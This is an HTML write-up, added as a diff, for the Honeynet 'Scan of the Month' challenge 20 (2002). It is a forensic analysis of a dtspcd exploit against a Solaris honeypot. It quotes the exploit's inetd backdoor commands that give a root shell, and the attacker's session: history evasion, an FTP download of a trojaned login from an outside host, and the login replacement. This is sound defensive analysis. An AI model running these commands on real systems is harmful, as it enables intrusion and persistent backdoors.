@@ -1,0 +1,273 @@
+<html><head>
+<title>Scan of the Month - Challenge 20 - April 2002</title></head>
+<body bgcolor="WHITE">
+
+<b>Scan of the Month - challenge 20 - April 2002<br>
+By: <a href="mailto:jkb@meddler.com"> Kent Brown </a> </b><p>
+
+</p><h2>The Challenge:</h2>
+<table border="0" width="75%">
+<tbody><tr><td>
+On 08 January, 2002 a default, unpatched installation of Solaris8 Sparc was remotely 
+compromised with the dtspcd exploit. What makes this attack interesting is that this 
+is the first time the attack was identified and captured in the wild, resulting a CERT
+advisory. Using the Snort binary capture of the attack, answer the following questions. 
+The honeypot that is attacked is 172.16.1.102. 
+</td></tr></tbody></table>
+
+<h2>Tools &amp; Methodology</h2>
+<b>Tools:</b><br>
+<ul>
+<li>  Redhat Linux 7.2 - Basic OS for supporting other tools and access.
+</li><li>  snort - IDS, used to sort through the tcpdump files.
+</li><li>  ethereal - sniffer, used to reconstruct what the attacker tried to do.
+</li><li>  google.com - The premier research facility.
+</li><li>  project.honeynet.org - whitepapers and other useful information.
+</li><li>  www.cert.org - Information on exploits and hacks.
+</li></ul>
+<p>
+
+<b>Methodology:</b><br>
+</p><ul>
+<li>  read the challenge completely.
+</li><li>  download the challenge file.
+</li><li>  verify the download.<br>
+      # md5sum 0108@000-snort.log.tar.gz <br>
+      The checksum's match, so the file is good.<br>
+</li><li>  decompress and untar.<br>
+      # tar xvfz 0108@000-snort.log.tar.gz <br>
+
+</li><li>
+Run through snort a couple of times:<br>
+snort -r 0108@000-snort.log -A full -l ./s1 -c snort.conf<br>
+snort -dv -r 0108@000-snort.log -l ./s2 host 172.16.1.102 -c snort.conf<br>
+
+</li><li>
+ethereal -n -r 0108@000-snort.log<br>
+find the interesting packet streams from the snort output and follow 
+some the TCP streams to reconstruct what the attacker did.
+
+</li><li>Analyze what happened and answer the questions based on all of the above.
+</li></ul>
+  
+
+
+<h2>Analysis</h2>
+<b>   1.What is a NOP slide, and how is this one different from the NOP slide 
+      in the rpc.statd exploit in Scan10? </b><p>
+
+<table border="0" width="70%">
+<tbody><tr><td>
+<ul><li>A NOP Slide is what happens when you execute a buffer overflow
+and overwrite one of the registers, such as EIP (the Effective Instruction Pointer), 
+which contains the Address of next Instruction.  This causes the system to jump
+a new address with a supplied payload.  NOPs are usually in front of the
+exploit code, and the jump is performed to one of those NOPs.  You then slide down
+the stack to the exploit code for execution.<p>
+
+</p></li><li>
+Scan 10's slide is UDP based, and binds a shell to port 39168 within the slide.
+The current slide is TCP based, and the slide executes code on the target machine
+to use inetd to watch for a stream from the ingreslock port of 1524.
+</li></ul>
+</td></tr></tbody></table>
+
+
+
+</p><p></p><hr><p>
+<b>   2.The attack was on 08 Jan, 2002. Would Snort have generated an alert 
+      then for the attack? </b></p><p>
+
+
+<table border="0" width="70%">
+<tbody><tr><td>
+<ul><li>No.  Snort would not have generated an alert based on the
+signature database at the time.
+While the exploit was publicly known at the time via a Cert Advisory<br>
+<a href="http://www.cert.org/advisories/CA-2001-31.html">
+    http://www.cert.org/advisories/CA-2001-31.html </a><br>and CVE
+<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2001-0803">
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2001-0803</a><br>
+The Snort signatures database did not have an entry to match that of
+the exploit itself on January 8, 2002.
+The Snort database was updated on Wed Mar 13 23:51:54 2002 with the signature
+for the dtspcd exploit.  This data is available at: <br>
+<a href="http://www.snort.org/snort-db/sid.html?id=1398">
+  http://www.snort.org/snort-db/sid.html?id=1398</a>
+</li></ul>
+<p>
+</p></td></tr></tbody></table>
+
+</p><p></p><hr><p>
+<b>   3.In the exploit code, the command "/bin/sh sh -i" is given, what is its 
+      purpose, and why is 'sh' shown twice? </b></p><p>
+
+<table border="0" width="70%">
+<tbody><tr><td>
+<ul><li>The '/bin/sh sh -i' is creating an interactive shell for the 
+attacker to use.<p>
+
+</p></li><li>The reason that 'sh' is shown twice is because inetd is being used to create
+that interactive shell via the '-i' argument.  The attacker is using '/tmp/x' as 
+his inetd.conf in this instance.  Its proper form is:<br>
+<pre>  service-name endpoint-type protocol wait-status uid server-program server-arguments
+</pre><p>
+
+From the inetd.conf man page we see the following:<br>
+</p><pre> server-arguments
+           If a server must  be  invoked  with  command  line
+           arguments,  the  entire  command  line  (including
+           argument 0) must appear in this field (which  con-
+           sists of all remaining words in the entry). If the
+           server expects inetd  to pass it  the  address  of
+           its peer (for compatibility with 4.2BSD executable
+           daemons), then the first argument to  the  command
+           should  be  specified  as  `%A'. No more than five
+           arguments are allowed in this field.
+</pre><br>
+Since 'sh' is argument 0, it must be repeated.  
+</li></ul><p>
+</p></td></tr></tbody></table>
+
+</p><p></p><hr><p>
+<b>   4.The attacker executed a variety of commands on the hacked Solaris box. 
+      Which commands were automated by the exploit, which commands were
+      manual by the attacker himself? </b>
+</p><p>
+
+
+<table border="0" width="70%">
+<tbody><tr><td>
+<ul><li>The following commands were part of the exploit itself:<br>
+
+
+/bin/ksh -c echo "ingreslock stream tcp nowait root /bin/sh sh -i"&gt;/tmp/x;<br>
+/usr/sbin/inetd -s /tmp/x;<br>
+sleep 10;<br>
+/bin/rm -f /tmp/x<br>
+</li></ul></td></tr></tbody></table>
+
+<table border="0" width="70%">
+<tbody><tr><td>
+<ul><li>Below is a transcript of the commands the attacker issued and their output:<br>
+
+
+<pre>uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`
+# SunOS buzzy 5.8 Generic_108528-03 sun4u sparc SUNW,Ultra-5_10
+/core: No such file or directory
+/var/dt/tmp/DTSPCD.log: No such file or directory
+BD PID(s): 3476
+# w
+  8:47am  up 11:24,  0 users,  load average: 0.12, 0.04, 0.02
+User     tty           login@  idle   JCPU   PCPU  what
+# unset HISTFILE
+# cd /tmp
+mkdir /usr/lib
+# mkdir: Failed to make directory "/usr/lib"; File exists
+# mv /bin/login /usr/lib/libfl.k
+# ftp 64.224.118.115
+ftp
+ftp: ioctl(TIOCGETP): Invalid argument
+Password:a@
+
+cd pub
+binary
+get sun1
+bye
+Name (64.224.118.115:root): # 
+# ls
+ps_data
+sun1
+# chmod 555 sun1
+# mv sun1 /bin/login
+# 
+</pre>
+<p>
+
+</p></li></ul></td></tr></tbody></table>
+
+
+</p><p></p><hr><p>
+<b>   5.What is sun1, and how does it work? </b></p><p>
+
+<table border="0" width="70%">
+<tbody><tr><td>
+<ul><li>
+	sun1 is a trojaned /bin/login program for Solaris. 
+	login is executed by in.telnetd after someone tries
+	to access the system.  In the case of the trojaned login,
+	it allows the attacker access to the system without using
+	regular system resources such as /etc/passwd and /etc/shadow.  It also
+	allows the attacker to circumvent normal logging and to remain
+	basically invisible on the system.
+</li></ul></td></tr></tbody></table>
+
+</p><p></p><hr><p>
+<b>   6.What did you learn from this exercise? </b></p><p>
+</p><ul>
+<li>   what a nop slide is
+</li><li>   the -i switch for sh, and the -d switch for ps
+</li><li>   ientd.conf's requirements for server-arguments
+</li><li>   as usual, a little more on attackers and their methodologies
+</li></ul>
+
+<p></p><hr><p>
+<b>   7.How long did this challenge take you? </b></p><p>
+
+preliminary reading/analysis/download:     0.5 hours
+            research/analysis/questions:     4 hours
+                                writeup:     2 hours
+                                  total:     6.5 hours
+
+
+<table border="0" width="40%">
+
+  </table>
+
+</p><p>
+
+</p><p></p><hr><p>
+<b>   Bonus Question:<br>
+One of the commands executed during the attack is:</b></p><p>
+
+<b>echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'` </b></p><p>
+
+<b>What is the purpose of this command and what does 'BD' stand for? </b></p><p>
+
+
+<table border="0" width="70%">
+<tbody><tr><td>
+<ul><li>
+
+The command portion within the back ticks,
+`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`, will check the process 
+table for any processes that contain the string: ' -s /tmp/x' AND do not contain 
+the string: grep.  This is then piped to awk command.  Awk is only interested in 
+the second variable as separated by whitespace, as referenced by:  awk '{print $2}'
+That data is the PID.  This is what is echoed to the screen after the colon from 
+the quoted: echo "BD PID(s): " at the beginning of the command:<p>
+
+output of the command is:
+BD PID(s): 3476 </p><p>
+
+</p></li><li>
+BD stands for BackDoor, and the attacker is echoing the BackDoor Process ID to the screen.<p>
+</p></li></ul></td></tr></tbody></table>
+
+</p><p></p><hr><p>
+
+<table border="0" cellspacing="0" width="100%">
+<tbody><tr valign="top">
+<td><font size="-2" face="Arial,Helvetica">
+April 2002 Challenge</font></td>
+<td align="center"><font size="-2" face="Arial,Helvetica">
+<a href="mailto:jkb@meddler.com">Feedback</a></font></td>
+<td align="right"><font size="-2" face="Arial,Helvetica">
+Updated:
+<script> var theDate=""; theDate = document.lastModified; document.write(theDate); </script>Fri, 26 Apr 2002 22:13:18 GMT
+</font></td></tr></tbody></table>
+
+
+
+
+</p></body></html>
